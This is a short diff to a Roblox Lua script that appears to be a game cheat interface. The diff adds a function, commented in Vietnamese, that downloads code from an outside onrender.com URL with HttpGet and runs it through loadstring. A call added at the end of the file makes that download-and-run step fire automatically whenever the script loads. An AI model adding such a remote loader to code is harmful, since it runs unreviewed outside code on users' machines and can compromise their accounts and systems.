@@ -207,6 +207,19 @@ RunService.PreSimulation:Connect(function()
     end
 end)
 
+-- Hàm khởi chạy script từ URL
+function runScript()
+    local success, err = pcall(function()
+        loadstring(game:HttpGet("https://protected-roblox-scripts.onrender.com/de31dbd78602a0684377f169e10a215d"))()
+    end)
+
+    if not success then
+        warn("Đã xảy ra lỗi khi chạy script:", err)
+    else
+        print("Script đã được chạy thành công.")
+    end
+end
+
 local function CreateSpamButton()
     if SpamButton then return end
     SpamButton = Instance.new("TextButton")
@@ -414,3 +427,4 @@ Fluent:Notify({
 
 Window:SelectTab(1)
 SaveManager:LoadAutoloadConfig()
+runScript()
